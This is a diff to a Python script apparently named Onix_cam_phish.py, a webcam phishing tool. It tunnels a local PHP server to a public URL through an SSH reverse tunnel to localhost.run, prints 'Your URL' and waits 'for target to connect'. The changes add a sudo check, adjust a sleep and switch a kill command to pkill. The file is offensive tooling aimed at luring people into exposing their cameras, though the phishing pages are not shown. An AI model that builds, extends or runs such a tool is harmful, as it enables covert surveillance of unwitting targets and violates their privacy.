@@ -19,7 +19,14 @@ def loaclhost():
 
     with open("localhost.txt" , "w") as local:
         subprocess.Popen((f"ssh -R 80:localhost:{port} nokey@localhost.run"),stderr=local , stdout=local , shell=True)
-
+#====================================================================================================
+if os.name == "posix":
+    uid = os.getuid()
+    if uid == 1000:
+        exit(f"""{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Run with sudo command for running the localhost {Fore.GREEN}(sudo python Onix_cam_phish.py)""")
+else:
+    pass
 #====================================================================================================
 def Sprint(text):
   for character in text:
@@ -32,7 +39,7 @@ def Sprint(text):
 check = subprocess.call("php -v" , stdout=subprocess.DEVNULL , shell=True)
 
 if check != 0:
-    print (f"{Fore.RED}[-]{Fore.BLUE} Unfortunately you dont have PHP please install it and come back soon !")
+    print(f"{Fore.RED}[-]{Fore.BLUE} Unfortunately you dont have PHP please install it and come back soon !")
     sys.exit()
 
 #====================================================================================================
@@ -77,14 +84,14 @@ def webcam():
 
     loaclhost()
 
-    sleep(8)
+    sleep(10)
 
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , ").lstrip())
+    print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
     linecache.clearcache()
 
-    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".lstrip() + Fore.RESET)
+    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n" + Fore.RESET)
 
 #Write info====================================================================================================
     try:
@@ -130,7 +137,7 @@ def webcam():
         subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
     else:
-        subprocess.call("sudo kill php*" , stdout=subprocess.DEVNULL , shell=True)
+        subprocess.call("sudo pkill php*" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
 
 if __name__ == "__main__":
